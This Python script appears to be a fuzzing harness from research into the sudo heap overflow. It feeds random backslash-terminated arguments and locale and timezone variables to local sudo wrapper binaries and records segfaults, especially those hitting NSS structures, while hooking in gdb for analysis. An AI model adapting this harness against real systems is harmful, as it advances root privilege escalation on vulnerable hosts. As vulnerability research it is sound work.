import json
import subprocess
import sys
import os
import random
import utils
import time
import os
from pathlib import Path

NEXT = "22223333"
#LIBRARY = "00001111"
#KNOWN = "AAAABBBB"
NAME = "XXXX/liveoverflow"

# taken from fengshui
#_SIZES = [i for i in range(0,0x1ff)]
_SIZES = [i for i in range(0,0x1ff)]
_SIZES += [i for i in range(0,0xfff, 8)]
_SIZES += [2**i for i in range(0,15)]
_SIZES += [(2**i)+1 for i in range(0,15)]
_SIZES += [(2**i)-1 for i in range(0,15)]

ALPHABET = '0123456789ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'


def run_sudo_check_crash(arg):
    args = ["/usr/bin/stdbuf","-o0","/home/user/Documents/sudoenv2"] + arg
    p = subprocess.Popen(args, bufsize=0,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        lines = p.communicate(b"x\nx\nx\nx\n",timeout=1)
    except subprocess.TimeoutExpired:
        p.terminate()

    if p.returncode == -11:
        return True
    return False

def run_sudo_waitgdb(arg):
    args = ["/usr/bin/stdbuf","-o0","/home/user/Documents/sudoenv3"] + arg
    p = subprocess.Popen(args, bufsize=0,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    utils.set_state(f'pid:{p.pid}')
    while utils.get_state() != 'continue':
        #print('waiting for continue...')
        time.sleep(1)
    print("received continue...")
    try:
        lines = p.communicate(b"x\nx\nx\nx\n",timeout=5)
        #print(lines)
    except subprocess.TimeoutExpired:
        p.terminate()
        print('terminated')

runs = 0
segfaults = 0
nss  = 0
while True:
    print(f"RUN #{runs} | {segfaults} segfaults and {nss} nss")
    #ARGV_1_SIZES = [i for i in range(229,245)]+[i for i in range(120,126)]
    ARGV_1_SIZES = random.choice(_SIZES)
    ARGV_1 = random.choice(ALPHABET)*random.choice(ARGV_1_SIZES)
    #ENV_1_SIZES = [i for i in range(1,400)]
    ENV_1_SIZES = random.choice(_SIZES)
    ENV_1 = random.choice(ALPHABET)*random.choice(ENV_1_SIZES)
    ENV_2 = random.choice(ALPHABET)*random.choice(_SIZES)
    LC_ALL = random.choice(ALPHABET)*random.choice(_SIZES)
    LOCPATH = random.choice(ALPHABET)*random.choice(_SIZES)
    TZ = random.choice(ALPHABET)*random.choice(_SIZES)

    arg = [
        # used for argv[1]: -s AAAAAA\ 
        ARGV_1+"\\",
        # used as env[]
        ENV_1,
        #"\\","\\","\\","\\","\\","\\","\\","\\", # LIBRARY
        #"\\","\\","\\","\\","\\","\\","\\","\\", # KNOWN
        #NAME+"\\",
        
    ]

    if random.randint(0,3):
        arg += ["ENV_2="+ENV_2]
    else:
        ENV_2 = ""
    if random.randint(0,3):
        arg += ["LC_ALL="+LC_ALL]
    else:
        LC_ALL = ""
    if random.randint(0,3):
        arg += ["LOCPATH="+LOCPATH]
    else:
        LOCPATH = ""
    if random.randint(0,3):
        arg += ["TZ="+TZ]
    else:
        TZ = ""

    if run_sudo_check_crash(arg):
        print('------------------- segfault')
        utils.set_state('segfault')
        run_sudo_waitgdb(arg)
        while True:
            state = utils.get_state()
            #print(f'waiting for done... {state}')
            if state.startswith('done'):
                print(f'received {state}...')
                if len(state[5:])>5:
                    fname = f'asd5/segfault:{state[5:]}.json'
                    if os.path.isfile(fname) and Path(fname).stat().st_size > 200000:
                        pass
                    else:
                        with open(fname,'a') as f:
                            f.write(json.dumps(arg)+"\n")
                    if 'nss' in state:
                        nss += 1
                        with open('nss.log', 'a') as f:
                            nss_log = f"{len(ARGV_1)},{len(ENV_1)},{len(ENV_2)},{len(LC_ALL)},{len(LOCPATH)},{len(TZ)},{state[5:]}\n"
                            print("got nss crash")
                            f.write(nss_log)
                break
            time.sleep(0.1)
        segfaults += 1
    runs += 1
